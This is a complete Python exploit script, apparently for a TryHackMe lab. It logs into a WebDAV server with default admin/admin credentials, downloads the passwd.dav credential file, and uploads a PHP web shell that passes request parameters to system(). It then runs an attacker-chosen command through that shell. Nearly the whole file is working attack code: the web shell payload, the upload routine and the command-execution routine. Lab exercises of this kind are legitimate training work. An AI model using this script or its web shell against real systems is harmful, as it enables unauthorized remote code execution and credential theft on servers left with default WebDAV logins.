#!/usr/bin/env python3

import argparse
import base64
import json
import os
import platform
import random
import re
import requests
import string

class Marsoc:
    def __init__(self, baseurl, username, password):
        if not(isinstance(baseurl,str)):
            raise TypeError(f"Baseurl must be a string. Got {type(baseurl)}")
        elif len(baseurl) < 1:
            raise ValueError("Baseurl must be a non-zero length string")

        if not(isinstance(username,str)):
            raise TypeError(f"Username must be a string. Got {type(username)}")
        elif len(username) < 1:
            raise ValueError("Username must be a non-zero length string")

        if not(isinstance(password,str)):
            raise TypeError(f"Password must be a string. Got {type(password)}")
        elif len(password) < 1:
            raise ValueError("Password must be a non-zero length string")

        self.__baseurl = baseurl
        self.__username = username
        self.__password = password

        self.__session = requests.Session()
        self.__headers = dict()

        self.__shellfile = str()
        return

    def __del__(self):
        success, message = self.Cleanup()
        if not(success):
            ErrMsg(message)
        else:
            SucMsg(message)

        return

    def __BuildShell(self):
        message = str()
        shellcontent = bytes()
        success = bool()

        try:
            shellcontent = b"<?php\nif (isset($_GET['c'])) {\n\tsystem(\"nohup \".$_GET['c']);\n} elseif (isset($_POST['c'])) {\n\tsystem(\"nohup \".$_POST['c']);\n}\n?>"

            self.__shellfile, success, message = GenRandomString(5,10)
            if not(success):
                raise ValueError(message)
            self.__shellfile = f"{self.__shellfile}.php"

            with open(self.__shellfile, "wb") as fptr:
                fptr.write(shellcontent)

            message = "shell successfully built"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def __SetHeaders(self):
        authstring = str()
        authstring64 = str()
        message = str()
        success = bool()

        try:
            authstring = f"{self.__username}:{self.__password}"
            authstring64 = base64.b64encode(authstring.encode()).decode()

            self.__headers["Authorization"] = f"Basic {authstring64}"

            message = "headers successfully set"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def Cleanup(self):
        message = str()
        success = bool()

        try:
            if os.path.isfile(self.__shellfile):
                SysMsgNB(f"removing \"{self.__shellfile}\" ...")
                try:
                    os.remove(self.__shellfile)
                    SucMsg(f"\"{self.__shellfile}\" successfully deleted")
                except Exception as ex:
                    ErrMsg(str(ex))

            message = "cleanup successful"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def DownloadPassword(self):
        message = str()
        success = bool()
        targetfile = "passwd.dav"
        targetroute = "webdav"
        targeturl = f"{self.__baseurl}/{targetroute}/{targetfile}"

        try:
            SysMsgNB(f"downloading \"{targetfile}\" ...")
            resp = self.__session.get(targeturl, headers=self.__headers)
            if resp.status_code != 200:
                raise ValueError(f"{ANSI_RED}[passwd.dav]{ANSI_RST} bad status code ({resp.status_code} {resp.reason})")

            SysMsgNB(f"saving \"{targetfile}\" locally ...")
            with open(targetfile, "wb") as fptr:
                fptr.write(resp.content)

            message = f"\"{targetfile}\" successfully downloaded"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def ExecCommand(self, command):
        message = str()
        output = str()
        params = dict()
        patterns = ["--.*", "--.*--", "Content-Disposition:.*"]
        success = bool()
        targetroute = "webdav"
        targeturl = f"{self.__baseurl}/{targetroute}/{self.__shellfile}"

        try:
            params["c"] = command

            resp = self.__session.post(targeturl, headers=self.__headers, params=params)
            if resp.status_code != 200:
                raise ValueError(f"{ANSI_RED}[command]{ANSI_RST} bad status code ({resp.status_code} {resp.reason})")

            output = resp.text

            for pattern in patterns:
                removestring, success, message = FindFlag(output, pattern)
                if not(success):
                    ErrMsg(message)
                    continue
                output = output.replace(removestring,"")

            output = output.strip("\r\n").strip("\n").strip("\r")

            message = "command successfully executed"
            success = True
        except Exception as ex:
            message = str(ex)
            output = ""
            success = False

        return (output, success, message)

    def Login(self):
        message = str()
        success = bool()
        targetroute = "webdav"
        targeturl = f"{self.__baseurl}/{targetroute}"

        try:
            success, message = self.__SetHeaders()
            if not(success):
                raise ValueError(message)

            resp = self.__session.get(targeturl, headers=self.__headers)
            if resp.status_code != 200:
                raise ValueError(f"{ANSI_RED}[login]{ANSI_RST} bad status code ({resp.status_code} {resp.reason})")

            message = "login successful"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

    def UploadShell(self):
        files = dict()
        message = str()
        shellname = str()
        success = bool()
        targetroute = "webdav"
        targeturl = str()

        try:
            success, message = self.__BuildShell()
            if not(success):
                raise ValueError(f"{ANSI_RED}[buildshell]{ANSI_RST} {message}")
            SucMsg(message)

            with open(self.__shellfile,"rb") as fptr:
                targeturl = f"{self.__baseurl}/{targetroute}/{self.__shellfile}"
                files = {self.__shellfile: fptr}

                resp = self.__session.put(targeturl, headers=self.__headers, files=files)
                if resp.status_code >= 400:
                    raise ValueError(f"{ANSI_RED}[upload]{ANSI_RST} bad status code ({resp.status_code} {resp.reason})")

            message = "shell successfully uploaded"
            success = True
        except Exception as ex:
            message = str(ex)
            success = False

        return (success, message)

############################################################
# Global Variables
############################################################

ANSI_CLRLN = "\r\x1b[2K\r"
ANSI_RST = "\x1b[0m"
ANSI_GRN = "\x1b[32;1m"
ANSI_RED = "\x1b[31;1m"
ANSI_BLU = "\x1b[34;1m"
ANSI_YLW = "\x1b[33;1m"

HTTPS_ENABLED = False

############################################################
# Formatting Functions
############################################################

def SucMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_GRN}+{ANSI_RST}] {msg}")
    return

def ErrMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_RED}-{ANSI_RST}] {msg}")
    return

def InfoMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}")
    return

def InfoMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_BLU}i{ANSI_RST}] {msg}", end="")
    return

def SysMsg(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}")
    return

def SysMsgNB(msg):
    print(f"{ANSI_CLRLN}[{ANSI_YLW}*{ANSI_RST}] {msg}", end="")
    return

############################################################
# Validation Functions
############################################################

def port_type(portno):
    portno = int(portno)

    if (portno < 1) or (portno > 65535):
        raise argparse.ArgumentError("Port must be within range 1 - 65535.")

    return portno

############################################################

def FindFlag(data, flagPattern=None):
    flag = str()
    message = str()
    success = bool()

    try:
        ############################################################
        # Make sure data var is bytes or string.
        ############################################################
        if not(isinstance(data,str)) and not(isinstance(data,bytes)):
            raise TypeError(f"Data must be string or bytes. Got {type(data)}.")

        if isinstance(data,str):
            data = data.encode('utf-8')

        if flagPattern is None:
            flagPattern = "thm{.*}"
 
        ############################################################
        # Make sure flag pattern var is bytes or string.
        ############################################################
        if not(isinstance(flagPattern,str)) and not(isinstance(flagPattern,bytes)):
            raise TypeError(f"FlagPattern must be string or bytes. Got {type(flagPattern)}.")

        ############################################################
        # Match type of data and flag pattern.
        ############################################################
        if type(flagPattern) != type(data):
            if isinstance(flagPattern,bytes):
                data = data.encode()
            elif isinstance(data,bytes):
                flagPattern = flagPattern.encode()

        ############################################################
        # Search for flag pattern.
        ############################################################
        reg = re.compile(flagPattern)
        matches = reg.findall(data)

        if len(matches) < 1:
            raise ValueError("flag not found in data")
        
        flag = matches[0]

        if isinstance(flag,bytes):
            flag = flag.decode('utf-8')

        message = f"flag found: \"{flag}\""
        success = True
    except Exception as ex:
        flag = ""
        message = str(ex)
        success = False

    return (flag, success, message)

def GenRandomString(minlen = None, maxlen = None):
    message = str()
    randstring = str()
    success = bool()

    try:
        alphabet = f"{string.ascii_lowercase}{string.ascii_uppercase}{string.digits}"

        ############################################################
        # Validate minlen value
        ############################################################
        if minlen is None:
            minlen = 8
        elif not(isinstance(minlen,int)):
            raise TypeError("Minlen must be int. Got {type(minlen)}")
        elif minlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Validate maxlen value
        ############################################################
        if maxlen is None:
            maxlen = 15
        elif not(isinstance(maxlen,int)):
            raise TypeError("Minlen must be int. Got {type(maxlen)}")
        elif maxlen < 1:
            raise ValueError("Minlen must be greater than 0")

        ############################################################
        # Make sure minlen <= maxlen
        ############################################################
        if minlen > maxlen:
            tmp = maxlen
            maxlen = minlen
            minlen = tmp

        ############################################################
        # Choose length of string
        ############################################################
        stringlen = random.randrange(minlen, maxlen)

        ############################################################
        # Build random string
        ############################################################
        for i in range(stringlen):
            curchoice = random.choice(alphabet)
            randstring = f"{randstring}{curchoice}"

        message = "random string generated"
        success = True
    except Exception as ex:
        message = str(ex)
        randstring = ""
        success = False
    return (randstring, success, message)

def main():
    scheme = str()

    if platform.system().lower() == "windows":
        os.system("")
    
    parser = argparse.ArgumentParser()

    ############################################################
    # Setup required command-line arguments.
    ############################################################
    parser.add_argument("target", help="IP address of target.", type=str)
    parser.add_argument("port", help="Port to connect to target on.", type=port_type)

    parser.add_argument("-u", "--username", help="username for login", dest="username", type=str, default="admin")
    parser.add_argument("-p", "--password", help="password for login", dest="password", type=str, default="admin")

    parser.add_argument("-c", "--command", help="command to execute on target", dest="command", type=str, default="whoami")

    parser.add_argument("--secure", help="use HTTPS scheme", action="store_true", dest="secure")

    args = parser.parse_args()

    target = args.target
    port = args.port
    secure = args.secure

    username = args.username
    password = args.password

    command = args.command

    ############################################################
    # Set HTTP scheme (HTTP or HTTPS) based on arguments.
    ############################################################
    if secure:
        scheme = "https"
    else:
        scheme = "http"

    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    print(f"{ANSI_GRN}{'Target Information':^60}{ANSI_RST}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")
    InfoMsg(f"Target IP: {target}")
    InfoMsg(f"Target Port: {port}")
    InfoMsg(f"Scheme: {scheme}")
    print(f"{ANSI_RED}{'='*60}{ANSI_RST}")

    baseurl = f"{scheme}://{target}:{port}"

    raider = Marsoc(baseurl, username, password)

    success, message = raider.Login()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    success, message = raider.DownloadPassword()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    success, message = raider.UploadShell()
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(message)

    output, success, message = raider.ExecCommand(command)
    if not(success):
        ErrMsg(message)
        exit(1)
    SucMsg(output)

    return

if __name__ == "__main__":
    main()

